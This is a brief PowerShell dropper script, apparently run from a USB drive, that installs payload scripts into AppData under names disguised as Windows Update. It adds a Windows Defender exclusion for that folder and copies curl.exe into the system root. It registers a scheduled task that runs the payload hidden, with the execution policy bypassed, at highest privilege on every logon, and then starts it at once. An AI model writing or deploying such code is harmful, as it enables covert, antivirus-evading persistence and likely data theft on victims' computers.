Add-MpPreference -ExclusionPath $env:appdata
Remove-Item -Recurse -Force $env:appdata\WindowsUpdate
New-Item -ItemType Directory -Force -Path "$env:appdata\WindowsUpdate\Temp"
$drv = ((gwmi win32_volume -f 'label=''YOURNAMELABEL''').Name)
Copy-Item "${drv}script_tele\Init.ps1"  "$env:appdata\WindowsUpdate\Update.ps1" -Force
Copy-Item "${drv}script_tele\MainMod.ps1" "$env:appdata\WindowsUpdate\Windows.ps1" -Force
Copy-Item "${drv}script_tele\Curl.exe" "$env:systemroot\Curl.exe" -Force
Copy-Item "${drv}script_tele\curl-ca-bundle.crt" "$env:systemroot\curl-ca-bundle.crt" -Force
schtasks /create /tn "WindowsUpdate" /sc ONLOGON /delay 0000:30 /rl highest /tr "powershell.exe -w hidden -ep bypass -file '$env:appdata\WindowsUpdate\Update.ps1'" /F
Set-Location $env:appdata\WindowsUpdate
.\"Update.ps1"